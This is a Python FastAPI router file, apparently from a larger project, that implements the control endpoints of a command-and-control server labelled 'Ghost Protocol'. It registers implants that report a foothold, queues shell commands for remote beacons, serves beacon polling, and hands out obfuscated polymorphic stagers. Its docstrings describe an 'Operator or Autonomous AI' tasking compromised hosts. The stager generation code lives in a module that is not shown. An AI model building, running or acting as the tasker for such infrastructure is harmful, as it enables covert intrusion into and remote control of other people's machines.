from fastapi import APIRouter, HTTPException, Depends
from pydantic import BaseModel
from typing import Dict, Any, List
from app.modules.ghost.c2_server import ghost_c2

router = APIRouter()

class BeaconRegistration(BaseModel):
    beacon_id: str
    metadata: Dict[str, Any]

class TaskRequest(BaseModel):
    beacon_id: str
    command: str
    args: List[str] = []

@router.post("/register", tags=["Ghost Protocol - C2"])
async def register_implant(registration: BeaconRegistration):
    """
    Tier 5: Offensive Operations - Implant Registration.
    A deployed payload calls this endpoint to announce it has successfully established a foothold.
    """
    try:
        response = ghost_c2.register_beacon(registration.beacon_id, registration.metadata)
        return response
    except Exception as e:
        print(f"[GHOST PROTOCOL] Registration failure: {e}")
        raise HTTPException(status_code=500, detail="Implant channel failure.")

@router.post("/task", tags=["Ghost Protocol - C2"])
async def queue_implant_task(request: TaskRequest):
    """
    Operator or Autonomous AI queues an instruction (e.g., 'whoami', 'ls') for the beacon.
    """
    try:
        task = ghost_c2.task_beacon(request.beacon_id, request.command, request.args)
        return {"status": "QUEUED", "task": task}
    except ValueError as ve:
        raise HTTPException(status_code=404, detail=str(ve))
    except Exception as e:
        raise HTTPException(status_code=500, detail="Tasking failure.")

@router.get("/poll/{beacon_id}", tags=["Ghost Protocol - C2"])
async def poll_tasks(beacon_id: str):
    """
    The beacon periodically hits this endpoint to see if Vanguard has queued new commands.
    """
    tasks = ghost_c2.retrieve_tasks(beacon_id)
    return {"tasks": tasks}

@router.get("/stager/{platform}", tags=["Ghost Protocol - C2"])
async def generate_stager(platform: str):
    """
    Tier 5: Offensive Operations - Polymorphic Stager Generation.
    Returns an obfuscated payload to establish a C2 connection.
    """
    import uuid
    beacon_id = f"impl-{str(uuid.uuid4())[:8]}"
    try:
        stager_data = ghost_c2.generate_polymorphic_stager(beacon_id, platform)
        return {"status": "SUCCESS", "beacon_id": beacon_id, "stager_package": stager_data}
    except Exception as e:
        raise HTTPException(status_code=500, detail="Stager synthesis failure.")
